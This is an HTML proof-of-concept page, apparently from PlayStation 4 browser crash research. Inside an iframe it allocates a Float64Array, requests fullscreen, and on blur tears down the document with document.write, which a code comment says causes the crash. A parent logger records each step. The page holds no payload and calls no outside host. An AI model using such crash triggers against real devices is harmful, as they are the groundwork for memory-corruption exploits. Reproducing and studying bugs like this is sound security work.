<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 Fullscreen Blur â€“ Iframe Corrected Audit</title>
</head>
<body>

<h1>Parent Logger</h1>
<pre id="log"></pre>

<script>
const log = m => {
  document.getElementById("log").textContent += m + "\n";
};

log("[PARENT] Ready");

const iframe = document.createElement("iframe");
iframe.style.width = "100%";
iframe.style.height = "200px";
iframe.style.border = "1px solid black";
document.body.appendChild(iframe);

const doc = iframe.contentDocument;
doc.open();
doc.write(`
<!DOCTYPE html>
<html>
<body>

<h3>Iframe Context</h3>
<button id="start">START</button>
<pre id="ilog"></pre>

<script>
const ilog = m => {
  document.getElementById("ilog").textContent += m + "\\n";
  parent.postMessage(m, "*");
};

document.getElementById("start").onclick = function () {
  ilog("[IFRAME] START clicked");

  // Allocate Float64Array (confirmed trigger class)
  let arr = new Float64Array(8);
  for (let i = 0; i < arr.length; i++) arr[i] = i + 1;

  ilog("[IFRAME] Float64Array allocated");

  // Request fullscreen INSIDE iframe
  const el = document.documentElement;
  if (el.webkitRequestFullscreen) {
    el.webkitRequestFullscreen();
    ilog("[IFRAME] Fullscreen requested");
  } else {
    ilog("[IFRAME] Fullscreen API missing");
  }

  window.onblur = function () {
    ilog("[IFRAME] onblur fired (OPTIONS)");

    // last observable point before teardown
    ilog("[IFRAME] About to document.write");

    // teardown that causes crash
    document.open();
    document.write("<html><body>teardown</body></html>");
    document.close();
  };
};
<\/script>

</body>
</html>
`);
doc.close();

window.addEventListener("message", e => {
  log("[MSG] " + e.data);
});
</script>

</body>
</html>
